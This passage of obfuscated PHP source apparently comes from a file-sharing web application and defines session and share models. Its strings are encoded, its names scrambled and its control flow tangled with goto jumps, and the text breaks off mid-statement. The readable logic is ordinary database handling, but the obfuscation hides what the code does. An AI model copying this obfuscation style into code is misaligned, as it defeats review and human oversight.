$AËÓÌ”ÛÕ¡($d›Ò½ÜÇ¤Š); goto FŠÁÕÃÄ¢; FŠÁÕÃÄ¢: $e¼íÕÌáá… = explode($_SERVER[…Ò×–][221], $a…«¤†ÈÅÚ); if (count($e¼íÕÌáá…) < $_SERVER[…Ò×–][565]) { $aëŒÉÔ¦” = $_SERVER[…Ò×–][801]; $aëŒÉÔ¦”(); } $CÖ¸÷‹¼¥ù = $_SERVER[…Ò×–][1135]; goto F‘äòˆíª; F‘äòˆíª: $CÖ¸÷‹¼¥ù($c”·à¯¿¢¨); goto cÓµ¬›µĞ; cÓµ¬›µĞ: } goto EÏôª‚ç¯Ö; aÌèÎù¬¾Ï: class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\x65\x6d\137\163\x65\163\x73\x69\157\x6e"; public function get($aŞ–…çœï¼) { $Dˆ†õÆÂ±º =& $_SERVER[…Ò×–]; $fÇÍÉÓ¤âÇ = $this->where(array($Dˆ†õÆÂ±º[2237] => $aŞ–…çœï¼))->find(); if (!is_array($fÇÍÉÓ¤âÇ)) { return !1; } return $fÇÍÉÓ¤âÇ[$Dˆ†õÆÂ±º[697]]; } public function set($B³ñšÎõ±‹, $f›èÄô…, $d£Ã‚÷Úæ = 3600) { $fßµ¾ò¿Ô© =& $_SERVER[…Ò×–]; $f±Ğ±ì­Šø = array($fßµ¾ò¿Ô©[2237] => $B³ñšÎõ±‹, $fßµ¾ò¿Ô©[2150] => $f›èÄô…, $fßµ¾ò¿Ô©[2238] => $d£Ã‚÷Úæ + time()); if (Session::get($fßµ¾ò¿Ô©[2239])) { $f±Ğ±ì­Šø[$fßµ¾ò¿Ô©[1450]] = Session::get($fßµ¾ò¿Ô©[2239]); } else { $f±Ğ±ì­Šø[$fßµ¾ò¿Ô©[1450]] = 0; } if ($this->get($B³ñšÎõ±‹)) { return $this->where(array($fßµ¾ò¿Ô©[2237] => $B³ñšÎõ±‹))->save($f±Ğ±ì­Šø); } else { return $this->add($f±Ğ±ì­Šø, array(), !0); } } public function remove($cÚ˜ƒÙÖò¼) { return $this->where(array($_SERVER[…Ò×–][2237] => $cÚ˜ƒÙÖò¼))->delete(); } public function clearTimeout() { return $this->where($_SERVER[…Ò×–][2240] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\145"; protected $dataAuto = array(array("\x6d\157\144\151\x66\171\x54\151\155\x65", "\164\151\155\145", "\x69\156\x73\x65\162\x74\54\x75\x70\x64\141\164\x65", "\146\x75\x6e\x63\x74\x69\157\156"), array("\x63\162\x65\141\164\x65\x54\x69\x6d\x65", "\x74\151\x6d\145", "\151\156\163\x65\x72\164", "\x66\165\x6e\x63\x74\x69\x6f\156"), array("\157\x70\x74\x69\157\x6e\163", '', "\x69\156\163\145\162\164\54\x75\x70\144\x61\x74\x65\54\163\x65\x6c\x65\x63\x74", "\152\163\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($Få×éëÛèã) { $bÑÍŒÑÀÍñ =& $_SERVER[…Ò×–]; $c„„¥µˆ‡ˆ = isset($Få×éëÛèã[0]) ? $Få×éëÛèã[0] : !1; return array($bÑÍŒÑÀÍñ[2241] => array(USER_ID, $bÑÍŒÑÀÍñ[2242]), $bÑÍŒÑÀÍñ[2190] => array($c„„¥µˆ‡ˆ, $bÑÍŒÑÀÍñ[2243])); } protected function listSimple() { $aùã¸ğ²Ñ• = array($_SERVER[…Ò×–][1450] => USER_ID); $C™ƒˆˆñ“ = $this->field($this->fieldList)->where($aùã¸ğ²Ñ•)->select(); return $C™ƒˆˆñ“ ? $C™ƒˆˆñ“ : array(); } protected function getInfo($Bï©ÕõõİÄ, $Fß¡æéÖôô = false) { $BÅ‹­´Ìå¾ =& $_SERVER[…Ò×–]; if ($Fß¡æéÖôô) { return $this->_getShareInfo(array($BÅ‹­´Ìå¾[444] => $Bï©ÕõõİÄ)); } $A‡Åñ¦í°Ø = $this->cacheFunctionGet($BÅ‹­´Ìå¾[2244], $Bï©ÕõõİÄ); return $A‡Åñ¦í°Ø; } public function getInfoByHash($A«¾Ñè’ğÒ) { return $this->_getShareInfo(array($_SERVER[…Ò×–][446] => $A«¾Ñè’ğÒ)); } public function getInfoByPath($DÃœ®õ¿ÕÉ) { $BÎñ¿…•Ç =& $_SERVER[…Ò×–]; $d­Ü¶œ÷Ùô = array($BÎñ¿…•Ç[1450] => USER_ID, $BÎñ¿…•Ç[373] => $DÃœ®õ¿ÕÉ); return $this->_getShareInfo($d­Ü¶œ÷Ùô); } public function getInfoBySourcePath($BÎ—«Ûöí„) { $E¸ƒãÆÙ‹Û =& $_SERVER[…Ò×–]; $c«øº°ìÄ¿ = array($E¸ƒãÆÙ‹Û[1450] => USER_ID, $E¸ƒãÆÙ‹Û[1030] => $BÎ—«Ûöí„); return $this->_getShareInfo($c«øº°ìÄ¿); } private function _getShareInfo($a¼Â‹‰ñ¹Ü) { goto D«èÙù; D«èÙù: $a¬®ä‰â¿ =& $_SERVER[…Ò×–]; $dóÈíô…›É = $this->where($a¼Â‹‰ñ¹Ü)->find(); if (!$dóÈíô…›É) { return !1; } goto d„Ğœ„Ø¦ó; d„Ğœ„Ø¦ó: $a¼Â‹‰ñ¹Ü = array($a¬®ä‰â¿[444] => $dóÈíô…›É[$a¬®ä‰â¿[444]]); $a­Š—›ñõ¯ = $a¬®ä‰â¿[2245]; $Fê’ç¿ğË‘ = Model($a¬®ä‰â¿[541])->order($a¬®ä‰â¿[371])->field($a­Š—›ñõ¯)->where($a¼Â‹‰ñ¹Ü)->select(); goto B…Œ¬§¤ô“; B…Œ¬§¤ô“: if ($dóÈíô…›É[$a¬®ä‰â¿[373]] == $a¬®ä‰â¿[473]) { $dóÈíô…›É[$a¬®ä‰â¿[395]] = IO::info($dóÈíô…›É[$a¬®ä‰â¿[1030]]); } else { $dóÈíô…›É[$a¬®ä‰â¿[395]] = Model($a¬®ä‰â¿[1127])->pathInfo($dóÈíô…›É[$a¬®ä‰â¿[373]]); } $dóÈíô…›É[$a¬®ä‰â¿[2246]] = $Fê’ç¿ğË‘; return $dóÈíô…›É; goto d´¬³õ¹µÔ; d´¬³õ¹µÔ: } protected function getInfoAuth($EÜÑÕÙèç¼) { $eë¸©×ëµ© =& $_SERVER[…Ò×–]; $eáÖìÆÀ¦‚ = $this->getInfo($EÜÑÕÙèç¼); $eáÖìÆÀ¦‚[$eë¸©×ëµ©[380]] = Model($eë¸©×ëµ©[459])->authMake($eáÖìÆÀ¦‚[$eë¸©×ëµ©[2246]]); return $eáÖìÆÀ¦‚; } protected function listData($B¡ ®°¬Î¦ = null, $EÌ±´Ú ×É = 300) { $cŒ¦œäã‡ =& $_SERVER[…Ò×–]; $c¬Œ…áÍ»ó = array(array($cŒ¦œäã‡[449] => array($cŒ¦œäã‡[932], 0), $cŒ¦œäã‡[451] => array($cŒ¦œäã‡[932], 0), $cŒ¦œäã‡[2247] => $cŒ¦œäã‡[2204])); if ($B¡ ®°¬Î¦ == $cŒ¦œäã‡[1885]) { $c¬Œ…áÍ»ó = array($cŒ¦œäã‡[449] => 1); } else { if ($B¡ ®°¬Î¦ == $cŒ¦œäã‡[1015]) { $c¬Œ…áÍ»ó = array($cŒ¦œäã‡[451] => 1); } } $c¬Œ…áÍ»ó[$cŒ¦œäã‡[1450]] = USER_ID; $dØÂåÚ÷š = $this->where($c¬Œ…áÍ»ó)->selectPage($EÌ±´Ú ×É); return $dØÂåÚ÷š; } protected function listToMe($B½’ˆ÷­’ã = 300) { goto AÙ„µŞ¥²; b¸Œ÷ÓñèÕ: $c±„Ä ¦× = array($d±å¯ä‘ÌÌ[2250] => $bÔÀ‡çæí‘, $d±å¯ä‘ÌÌ[2251] => $f“Ğ°ó¿´[$d±å¯ä‘ÌÌ[355]]); return $c±„Ä ¦×; goto B‹ÜŒ™İº; AÙ„µŞ¥²: $d±å¯ä‘ÌÌ =& $_SERVER[…Ò×–]; $f‚æØœœÜ = Model($d±å¯ä‘ÌÌ[2248])->userGroupParents(USER_ID); $Cö®æêÁ… = array($d±å¯ä‘ÌÌ[526] => SourceModel::TYPE_USER, $d±å¯ä‘ÌÌ[461] => USER_ID); goto BÄ£ÍÔòÕç; dÇõ¼×Ÿ‘¸: $bÔÀ‡çæí‘ = $this->field($b¹Ò­ÄØ‡)->where($Cö®æêÁ…)->select(); foreach ($bÔÀ‡çæí‘ as $FÀ™†Ê‘© => &$DÓƒ¤‘ŠÌŠ) { $DÓƒ¤‘ŠÌŠ[$d±å¯ä‘ÌÌ[2246]] = $BœÌ¹é‚®[$DÓƒ¤‘ŠÌŠ[$d±å¯ä‘ÌÌ[444]]]; } unset($DÓƒ¤‘ŠÌŠ); goto b¸Œ÷ÓñèÕ; BÄ£ÍÔòÕç: if ($f‚æØœœÜ) { $Cö®æêÁ… = array(array($d±å¯ä‘ÌÌ[526] => SourceModel::TYPE_USER, $d±å¯ä‘ÌÌ[461] => USER_ID), array($d±å¯ä‘ÌÌ[526] => SourceModel::TYPE_GROUP, $d±å¯ä‘ÌÌ[461] => array($d±å¯ä‘ÌÌ[7], $f‚æØœœÜ)), $d±å¯ä‘ÌÌ[2247] => $d±å¯ä‘ÌÌ[2204]); } $f“Ğ°ó¿´ = Model($d±å¯ä‘ÌÌ[541])->where($Cö®æêÁ…)->selectPage($B½’ˆ÷­’ã); $BœÌ¹é‚® = array_to_keyvalue_group($f“Ğ°ó¿´[$d±å¯ä‘ÌÌ[358]], $d±å¯ä‘ÌÌ[444]); goto b¹‚‡”ƒí; b¹‚‡”ƒí: if (!$BœÌ¹é‚®) { return $f“Ğ°ó¿´; } $b¹Ò­ÄØ‡ = $d±å¯ä‘ÌÌ[2249]; $Cö®æêÁ… = array($d±å¯ä‘ÌÌ[444] => array($d±å¯ä‘ÌÌ[388], array_keys($BœÌ¹é‚®))); goto dÇõ¼×Ÿ‘¸; B‹ÜŒ™İº: } protected function shareAdd($f­˜ìË×ˆ, $CİÒ­˜Éê) { $A¢‡’ßï²× =& $_SERVER[…Ò×–]; $aàÍ×Ü²šë = $this->_addShareData($f­˜ìË×ˆ, $CİÒ­˜Éê); if (!empty($CİÒ­˜Éê[$A¢‡’ßï²×[2252]])) { $this->_shareAuthSet($aàÍ×Ü²šë, $CİÒ­˜Éê[$A¢‡’ßï²×[2252]]); } $this->shareEventAdd($f­˜ìË×ˆ, $CİÒ­˜Éê, $A¢‡’ßï²×[1018]); return $aàÍ×Ü²šë; } private function shareEventAdd($EŒĞ‹ëŒæ, $Bù•ëÈ¥”, $dš‰¸äÓ‹Ò = "\141\x64\x64") { goto BÔ—ÇÕÄ´Ÿ; BÙ÷œÛä‰Â: return; goto C¡ì¿°ÀŒï; fÌóœ†ÇŒ: $E©‰’÷µò² = $A™ààó…¶–[2255]; if ($AèæìÑßÆù[$A™ààó…¶–[449]] == $A™ààó…¶–[473] && $Bù•ëÈ¥”[$A™ààó…¶–[449]] == $A™ààó…¶–[83]) { $E©‰’÷µò² = $A™ààó…¶–[2253]; } if ($AèæìÑßÆù[$A™ààó…¶–[449]] == $A™ààó…¶–[83] && $Bù•ëÈ¥”[$A™ààó…¶–[449]] == $A™ààó…¶–[473]) { $E©‰’÷µò² = $A™ààó…¶–[2256]; } goto DÜñößé‡™; DÜñößé‡™: if ($AèæìÑßÆù[$A™ààó…¶–[451]] == $A™ààó…¶–[473] && $Bù•ëÈ¥”[$A™ààó…¶–[451]] == $A™ààó…¶–[83]) { $E©‰’÷µò² = $A™ààó…¶–[2254]; } if ($AèæìÑßÆù[$A™ààó…¶–[451]] == $A™ààó…¶–[83] && $Bù•ëÈ¥”[$A™ààó…¶–[451]] == $A™ààó…¶–[473]) { $E©‰’÷µò² = $A™ààó…¶–[2257]; } Model($A™ààó…¶–[510])->eventShare($EŒĞ‹ëŒæ, $E©‰’÷µò²); goto BÙ÷œÛä‰Â; BÔ—ÇÕÄ´Ÿ: $A™ààó…¶– =& $_SERVER[…Ò×–]; if ($dš‰¸äÓ‹Ò == $A™ààó…¶–[1018]) { if ($Bù•ëÈ¥”[$A™ààó…¶–[449]] == $A™ààó…¶–[83]) { Model($A™ààó…¶–[510])->eventShare($EŒĞ‹ëŒæ, $A™ààó…¶–[2253]); } if ($Bù•ëÈ¥”[$A™ààó…¶–[451]] == $A™ààó…¶–[83]) { Model($A™ààó…¶–[510])->eventShare($EŒĞ‹ëŒæ, $A™ààó…¶–[2254]); } return; } $AèæìÑßÆù = $this->getInfoByPath($EŒĞ‹ëŒæ); goto fÌóœ†ÇŒ; C¡ì¿°ÀŒï: } private function _addShareData($D‡ŞØ¦èÌ, $AÃéëÃâ’ = array()) { goto A»á¾“²¿; aÈØĞˆÃˆ£: $BƒŒ˜¯ñ = $this->add($aùŠœ×Ó’˜); $bŸ³Œ…ÎÏµ = array($eÛêˆ°Ú¯[446] => short_id($BƒŒ˜¯ñ)); $this->where(array($eÛêˆ°Ú¯[443] => $BƒŒ˜¯ñ))->save($bŸ³Œ…ÎÏµ); goto A‚·Ö¾ãá™; A»á¾“²¿: $eÛêˆ°Ú¯ =& $_SERVER[…Ò×–]; $Bí ¶ğ½Í± = array($eÛêˆ°Ú¯[387] => $D‡ŞØ¦èÌ, $eÛêˆ°Ú¯[1441] => USER_ID); if ($D‡ŞØ¦èÌ == 0) { $Bí ¶ğ½Í± = array($eÛêˆ°Ú¯[2258] => $AÃéëÃâ’[$eÛêˆ°Ú¯[1030]], $eÛêˆ°Ú¯[1441] => USER_ID); } goto eŒ¥ĞÃôÕ; f¼Ò×ëƒ„: $aùŠœ×Ó’˜ = array($eÛêˆ°Ú¯[1441] => USER_ID, $eÛêˆ°Ú¯[387] => $D‡ŞØ¦èÌ, $eÛêˆ°Ú¯[1354] => $eÛêˆ°Ú¯[33], $eÛêˆ°Ú¯[449] => 0, $eÛêˆ°Ú¯[451] => 0, $eÛêˆ°Ú¯[1030] => $eÛêˆ°Ú¯[33], $eÛêˆ°Ú¯[299] => $eÛêˆ°Ú¯[33], $eÛêˆ°Ú¯[811] => $eÛêˆ°Ú¯[33], $eÛêˆ°Ú¯[2259] => 0, $eÛêˆ°Ú¯[2260] => 0, $eÛêˆ°Ú¯[452] => 0, $eÛêˆ°Ú¯[453] => $eÛêˆ°Ú¯[33], $eÛêˆ°Ú¯[446] => $eÛêˆ°Ú¯[33]); $AÂˆÙ¬‰ = explode($eÛêˆ°Ú¯[47], $eÛêˆ°Ú¯[2261]); foreach ($AÂˆÙ¬‰ as $DÌø×ä¯‘) { if (!isset($AÃéëÃâ’[$DÌø×ä¯‘])) { continue; } $aùŠœ×Ó’˜[$DÌø×ä¯‘] = $AÃéëÃâ’[$DÌø×ä¯‘]; } goto aÈØĞˆÃˆ£; A‚·Ö¾ãá™: return $BƒŒ˜¯ñ; goto Dó¶à“ ·É; eŒ¥ĞÃôÕ: if ($b±’öé¥”ä = $this->where($Bí ¶ğ½Í±)->find()) { return $b±’öé¥”ä[$eÛêˆ°Ú¯[444]]; } if ($D‡ŞØ¦èÌ == 0) { $dëÃ×‘É‡ = array($eÛêˆ°Ú¯[28] => get_path_this($AÃéëÃâ’[$eÛêˆ°Ú¯[75]])); } else { $dëÃ×‘É‡ = Model($eÛêˆ°Ú¯[757])->sourceInfo($D‡ŞØ¦èÌ); if (!$dëÃ×‘É‡) { return !1; } } if (!$AÃéëÃâ’[$eÛêˆ°Ú¯[1354]]) { $AÃéëÃâ’[$eÛêˆ°Ú¯[1354]] = $dëÃ×‘É‡[$eÛêˆ°Ú¯[28]]; } goto f¼Ò×ëƒ„; Dó¶à“ ·É: } private function _shareAuthSet($Dƒ°×¸Ê¯, $dŠÕÈõ´) { goto EğäËøã”ª; E‚°¤íéí¸: return $d¢º—‡Êº->addAll($cøÓŒùçä…, array(), !0); goto A®ÆÄ®ßÔ¤; EğäËøã”ª: $bùæÃÆÅ½ =& $_SERVER[…Ò×–]; if (!is_array($dŠÕÈõ´)) { return !1; } $d¢º—‡Êº = Model($bùæÃÆÅ½[2262]); goto CÄåİ¬§ í; CÄåİ¬§ í: $d¢º—‡Êº->where(array($bùæÃÆÅ½[444] => $Dƒ°×¸Ê¯))->delete(); $cøÓŒùçä… = array(); foreach ($dŠÕÈõ´ as $fÇ¬÷ÉÒï) { $a­ĞãØ çÄ = SourceModel::TYPE_USER; if ($fÇ¬÷ÉÒï[$bùæÃÆÅ½[375]] == SourceModel::TYPE_GROUP) { $a­ĞãØ çÄ = SourceModel::TYPE_GROUP; } $d•õ–Ç° = array($bùæÃÆÅ½[444] => $Dƒ°×¸Ê¯, $bùæÃÆÅ½[375] => $a­ĞãØ çÄ, $bùæÃÆÅ½[461] => intval($fÇ¬÷ÉÒï[$bùæÃÆÅ½[461]]), $bùæÃÆÅ½[2263] => 0, $bùæÃÆÅ½[2264] => -1); if ($fÇ¬÷ÉÒï[$bùæÃÆÅ½[2263]]) { $d•õ–Ç°[$bùæÃÆÅ½[2263]] = $fÇ¬÷ÉÒï[$bùæÃÆÅ½[2263]]; } else { if ($fÇ¬÷ÉÒï[$bùæÃÆÅ½[2264]]) { $d•õ–Ç°[$bùæÃÆÅ½[2264]] = $fÇ¬÷ÉÒï[$bùæÃÆÅ½[2264]]; } } $cøÓŒùçä…[] = $d•õ–Ç°; } goto E‚°¤íéí¸; A®ÆÄ®ßÔ¤: } public function numViewAdd($E»°±ãÀ‘) { $cƒŒÆº³¤Ì =& $_SERVER[…Ò×–]; $d¸ªÒ§ÄÌ = array($cƒŒÆº³¤Ì[443] => $E»°±ãÀ‘); $this->where($d¸ªÒ§ÄÌ)->setAdd($cƒŒÆº³¤Ì[2259]); } public function numDownloadAdd($aÈŞŞß”›‰) { $d»ïÇ’à—¢ =& $_SERVER[…Ò×–]; $Dê—ÅŠùÄ = array($d»ïÇ’à—¢[443] => $aÈŞŞß”›‰); $this->where($Dê—ÅŠùÄ)->setAdd($d»ïÇ’à—¢[2260]); } protected function shareEdit($F™™»åÙ‚„, $f“Î‹ï¥›‰) { goto f¥º¯‰ÛŸÂ; d¢Å‰³××: if (isset($f“Î‹ï¥›‰[$Aƒ¾±ÅÍğÏ[2252]])) { $this->_shareAuthSet($F™™»åÙ‚„, $f“Î‹ï¥›‰[$Aƒ¾±ÅÍğÏ[2252]]); } return !0; goto Fª¶ê×¡â¤; f¥º¯‰ÛŸÂ: $Aƒ¾±ÅÍğÏ =& $_SERVER[…Ò×–]; $C‡î»À†óâ = $this->getInfo($F™™»åÙ‚„); if (!$C‡î»À†óâ) { return !1; } goto b‹Ğœ–£Êœ; b‹Ğœ–£Êœ: $this->_checkLinkShare($f“Î‹ï¥›‰, $C‡î»À†óâ); $D•Àã²Ëèš = array(); $CƒÊ‚²œ = explode($Aƒ¾±ÅÍğÏ[47], $Aƒ¾±ÅÍğÏ[2265]); goto e²å“Ğß®Á; e²å“Ğß®Á: foreach ($CƒÊ‚²œ as $E‘ØÏÍ¦ñ©) { if (!array_key_exists($E‘ØÏÍ¦ñ©, $f“Î‹ï¥›‰)) { continue; } $D•Àã²Ëèš[$E‘ØÏÍ¦ñ©] = $f“Î‹ï¥›‰[$E‘ØÏÍ¦ñ©]; } $this->shareEventAdd($C‡î»À†óâ[$Aƒ¾±ÅÍğÏ[373]], $f“Î‹ï¥›‰, $Aƒ¾±ÅÍğÏ[2086]); $this->where(array($Aƒ¾±ÅÍğÏ[443] => $F™™»åÙ‚„))->save($D•Àã²Ëèš); goto d¢Å‰³××; Fª¶ê×¡â¤: } private function _checkLinkShare($dÆ‰Ç­‰ØÄ, $CöàŠëØî) { goto A¡À²Î‰Ö±; c¾ÍÂåá´²: $EÏÑ²æ½Ó’ = $this->shareFileMeta($BÜÁê“±åå[$d‡ù¢«™Ú–[423]]); if (isset($EÏÑ²æ½Ó’[$d‡ù¢«™Ú–[363]]) && $EÏÑ²æ½Ó’[$d‡ù¢«™Ú–[363]] == $d‡ù¢«™Ú–[83]) { show_json(LNG($d‡ù¢«™Ú–[2268]), !1); } goto a¹¤‰Îƒ –; A¡À²Î‰Ö±: $d‡ù¢«™Ú– =& $_SERVER[…Ò×–]; if ($dÆ‰Ç­‰ØÄ[$d‡ù¢«™Ú–[449]] != $d‡ù¢«™Ú–[83]) { return; } $C¯Ğ•’àÜÒ = $CöàŠëØî[$d‡ù¢«™Ú–[395]][$d‡ù¢«™Ú–[373]]; goto DîÃå’ŠŞè; DîÃå’ŠŞè: if ($CöàŠëØî[$d‡ù¢«™Ú–[395]][$d‡ù¢«™Ú–[29]] != $d‡ù¢«™Ú–[171]) { $CÍöÙ¿µ„… = $this->_folderReport($C¯Ğ•’àÜÒ); if (!$CÍöÙ¿µ„…) { return; } show_json(LNG($d‡ù¢«™Ú–[2266]) . $d‡ù¢«™Ú–[2267] . $CÍöÙ¿µ„…, !1); } $BÜÁê“±åå = Model($d‡ù¢«™Ú–[757])->fileInfoGet($CöàŠëØî[$d‡ù¢«™Ú–[395]][$d‡ù¢«™Ú–[373]]); if (!$BÜÁê“±åå) { return; } goto c¾ÍÂåá´²; a¹¤‰Îƒ –: } private function _folderReport($Dòº“†Û¾³) { goto Cè¾æë“í; DĞ‘ğ‰Õ¿: $D¥ô†Ó = array($F‡Œ¦ÒÑ•Ñ[423] => array($F‡Œ¦ÒÑ•Ñ[7], $E³ô‰‰¤Á), $F‡Œ¦ÒÑ•Ñ[464] => array($F‡Œ¦ÒÑ•Ñ[756], "\45{$f³‰Ø‰Ï½}\45"), $F‡Œ¦ÒÑ•Ñ[401] => 0); $AäóöĞ® = Model($F‡Œ¦ÒÑ•Ñ[757])->where($D¥ô†Ó)->field($F‡Œ¦ÒÑ•Ñ[2270])->find(); if (!$AäóöĞ®) { return !1; } goto BÌó¡Ñø¨È; bñ•òî ß¨: $aÌööù¼© = array_to_keyvalue($EÌîëéò‡›, $F‡Œ¦ÒÑ•Ñ[33], $F‡Œ¦ÒÑ•Ñ[28]); $aÌööù¼©[] = $AäóöĞ®[$F‡Œ¦ÒÑ•Ñ[28]]; return implode($F‡Œ¦ÒÑ•Ñ[8], $aÌööù¼©); goto f¥µ××–¤¢; BÌó¡Ñø¨È: $E­œ§ëÛ = substr($AäóöĞ®[$F‡Œ¦ÒÑ•Ñ[464]], strpos($AäóöĞ®[$F‡Œ¦ÒÑ•Ñ[464]], $f³‰Ø‰Ï½)); $D¥ô†Ó = array($F‡Œ¦ÒÑ•Ñ[373] => array($F‡Œ¦ÒÑ•Ñ[7], trim($E­œ§ëÛ, $F‡Œ¦ÒÑ•Ñ[47]))); $EÌîëéò‡› = Model($F‡Œ¦ÒÑ•Ñ[757])->where($D¥ô†Ó)->field($F‡Œ¦ÒÑ•Ñ[28])->select(); goto bñ•òî ß¨; Cè¾æë“í: $F‡Œ¦ÒÑ•Ñ =& $_SERVER[…Ò×–]; $D¥ô†Ó = array($F‡Œ¦ÒÑ•Ñ[423] => array($F‡Œ¦ÒÑ•Ñ[932], 0), $F‡Œ¦ÒÑ•Ñ[694] => 3); $E³ô‰‰¤Á = Model($F‡Œ¦ÒÑ•Ñ[2269])->where($D¥ô†Ó)->field($F‡Œ¦ÒÑ•Ñ[423])->select(); goto bô¼¬ùøÛã; bô¼¬ùøÛã: if (!$E³ô‰‰¤Á) { return !1; } $E³ô‰‰¤Á = array_to_keyvalue($E³ô‰‰¤Á, $F‡Œ¦ÒÑ•Ñ[33], $F‡Œ¦ÒÑ•Ñ[423]); $f³‰Ø‰Ï½ = $F‡Œ¦ÒÑ•Ñ[47] . $Dòº“†Û¾³ . $F‡Œ¦ÒÑ•Ñ[47]; goto DĞ‘ğ‰Õ¿; f¥µ××–¤¢: } protected function remove($CóŞİ…Äò») { goto AŒœòŠÅÑ; cˆÕ‚Š¤ÏÜ: $a›Ñ¹Ø˜ö = $this->where($DÀµ§ÑµÚÎ)->delete(); if ($a›Ñ¹Ø˜ö) { Model($båê¼ìÂÖï[541])->where(array($båê¼ìÂÖï[444] => $CóŞİ…Äò»))->delete(); } $E˜Ñ¢ƒŸÏ¥ = is_array($CóŞİ…Äò») ? $CóŞİ…Äò»[1] : array($CóŞİ…Äò»); goto a³»à‘‡òí; AŒœòŠÅÑ: $båê¼ìÂÖï =& $_SERVER[…Ò×–]; if (is_array($CóŞİ…Äò»)) { $CóŞİ…Äò» = array($båê¼ìÂÖï[7], $CóŞİ…Äò»); } $DÀµ§ÑµÚÎ = array($båê¼ìÂÖï[444] => $CóŞİ…Äò»); goto cˆÕ‚Š¤ÏÜ; a³»à‘‡òí: for ($Bì·Ùë®ë = 0; $Bì·Ùë®ë < count($E˜Ñ¢ƒŸÏ¥); $Bì·Ùë®ë++) { $CÍÔÛÚÖÚ = $this->getInfo($E˜Ñ¢ƒŸÏ¥[$Bì·Ùë®ë]); if ($CÍÔÛÚÖÚ[$båê¼ìÂÖï[451]] == $båê¼ìÂÖï[83]) { Model($båê¼ìÂÖï[510])->eventShare($CÍÔÛÚÖÚ[$båê¼ìÂÖï[373]], $båê¼ìÂÖï[2257]); } if ($CÍÔÛÚÖÚ[$båê¼ìÂÖï[449]] == $båê¼ìÂÖï[83]) { Model($båê¼ìÂÖï[510])->eventShare($CÍÔÛÚÖÚ[$båê¼ìÂÖï[373]], $båê¼ìÂÖï[2256]); } } return $a›Ñ¹Ø˜ö; goto Eõğá‚‰êÍ; Eõğá‚‰êÍ: } protected function removeBySource($A…±İ×äÓ) { goto Dà×Ì“ã‹Õ; a«ùƒ±éÖª: $dÈ––º¯‡¼ = array_to_keyvalue($dÈ––º¯‡¼, $EèÁÚ¶¸˜[33], $EèÁÚ¶¸˜[444]); if (!$dÈ––º¯‡¼) { return; } $fÔÍùØ‰¯¦ = array($EèÁÚ¶¸˜[443] => array($EèÁÚ¶¸˜[388], $dÈ––º¯‡¼)); goto dš’’†Œ·; Dà×Ì“ã‹Õ: $EèÁÚ¶¸˜ =& $_SERVER[…Ò×–]; $fÔÍùØ‰¯¦ = array($EèÁÚ¶¸˜[387] => array($EèÁÚ¶¸˜[388], $A…±İ×äÓ)); $dÈ––º¯‡¼ = $this->field($EèÁÚ¶¸˜[444])->where($fÔÍùØ‰¯¦)->select(); goto a«ùƒ±éÖª; dš’’†Œ·: $this->where($fÔÍùØ‰¯¦)->delete(); Model($EèÁÚ¶¸˜[541])->where($fÔÍùØ‰¯¦)->delete(); goto BÜáÕåóŠâ; BÜáÕåóŠâ: } public function listAll($fÂÑè„æ) { goto cÏˆ„ŠÑİ…; E©İ«çö×ê: if ($fÂÑè„æ[$FÂ‚ÁĞ¦İí[707]]) { $BªßÕ½¦Ü = $fÂÑè„æ[$FÂ‚ÁĞ¦İí[452]] ? $fÂÑè„æ[$FÂ‚ÁĞ¦İí[452]] : strtotime(date($FÂ‚ÁĞ¦İí[2271])); $bŒÚ‚ÃÄÚë[$FÂ‚ÁĞ¦İí[191]] = array($FÂ‚ÁĞ¦İí[325], array($fÂÑè„æ[$FÂ‚ÁĞ¦İí[707]], $BªßÕ½¦Ü)); } if ($fÂÑè„æ[$FÂ‚ÁĞ¦İí[29]]) { $bŒÚ‚ÃÄÚë[$fÂÑè„æ[$FÂ‚ÁĞ¦İí[29]]] = 1; } else { $bŒÚ‚ÃÄÚë[] = array($FÂ‚ÁĞ¦İí[449] => array($FÂ‚ÁĞ¦İí[932], 0), $FÂ‚ÁĞ¦İí[451] => array($FÂ‚ÁĞ¦İí[932], 0), $FÂ‚ÁĞ¦İí[2247] => $FÂ‚ÁĞ¦İí[2204]); } if ($fÂÑè„æ[$FÂ‚ÁĞ¦İí[2200]]) { $bŒÚ‚ÃÄÚë[] = array($FÂ‚ÁĞ¦İí[446] => $fÂÑè„æ[$FÂ‚ÁĞ¦İí[2200]], $FÂ‚ÁĞ¦İí[1354] => array($FÂ‚ÁĞ¦İí[756], "\x25{$fÂÑè„æ[$FÂ‚ÁĞ¦İí[2200]]}\45"), $FÂ‚ÁĞ¦İí[2247] => $FÂ‚ÁĞ¦İí[2204]); } goto F©±Ğ¥¾èÔ; F©±Ğ¥¾èÔ: $E¬¶ŞƒÂ‘ = $this->_makeOrder()->where($bŒÚ‚ÃÄÚë)->selectPage(20); if (empty($E¬¶ŞƒÂ‘[$FÂ‚ÁĞ¦İí[358]])) { return array(); } $this->_listDataApply($E¬¶ŞƒÂ‘[$FÂ‚ÁĞ¦İí[358]]); goto fÕÏŞÈ›ÇÆ; cÏˆ„ŠÑİ…: $FÂ‚ÁĞ¦İí =& $_SERVER[…Ò×–]; $bŒÚ‚ÃÄÚë = array(); if ($fÂÑè„æ[$FÂ‚ÁĞ¦İí[1450]]) { $bŒÚ‚ÃÄÚë[$FÂ‚ÁĞ¦İí[1450]] = $fÂÑè„æ[$FÂ‚ÁĞ¦İí[1450]]; } goto E©İ«çö×ê; fÕÏŞÈ›ÇÆ: return $E¬¶ŞƒÂ‘; goto bá¯ÑĞÒ‡á; bá¯ÑĞÒ‡á: } public function listDataApply($cğØ£²±äò) { $this->_listDataApply($cğØ£²±äò); return $cğØ£²±äò; } private function _listDataApply(&$aÇ¦ê¾Úƒ) { goto f³É‡ğÅ; A£Š¯è¤İ: $dæøƒ¾ó‰ = array_to_keyvalue($aÇ¦ê¾Úƒ, $f¶Ï•ôˆ¸[33], $f¶Ï•ôˆ¸[373]); $C„¸ŠâÂ³ñ = Model($f¶Ï•ôˆ¸[757])->sourceListInfo($dæøƒ¾ó‰, !0); foreach ($aÇ¦ê¾Úƒ as &$EÇŸ½‹ÎÃ) { $cÓ“Òß§ëÙ = $EÇŸ½‹ÎÃ[$f¶Ï•ôˆ¸[1450]]; $EÇŸ½‹ÎÃ[$f¶Ï•ôˆ¸[2272]] = $D³áÄñÏëÆ[$cÓ“Òß§ëÙ] ? $D³áÄñÏëÆ[$cÓ“Òß§ëÙ] : 